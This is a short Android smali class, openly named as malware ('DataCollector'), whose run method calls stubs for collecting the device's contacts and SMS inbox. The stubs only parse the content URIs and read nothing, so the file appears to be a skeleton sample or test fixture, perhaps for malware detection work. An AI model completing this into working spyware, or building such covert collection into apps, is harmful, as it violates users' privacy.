.class public Lcom/example/malware/DataCollector;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;
.source "DataCollector.java"

.field private context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/example/malware/DataCollector;->context:Landroid/content/Context;
    return-void
.end method

.method public run()V
    .locals 1
    invoke-virtual {p0}, Lcom/example/malware/DataCollector;->collectContacts()V
    invoke-virtual {p0}, Lcom/example/malware/DataCollector;->collectSMS()V
    return-void
.end method

.method public collectContacts()V
    .locals 3
    iget-object v0, p0, Lcom/example/malware/DataCollector;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "content://com.android.contacts/contacts"
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v1
    return-void
.end method

.method public collectSMS()V
    .locals 3
    iget-object v0, p0, Lcom/example/malware/DataCollector;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "content://sms/inbox"
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v1
    return-void
.end method
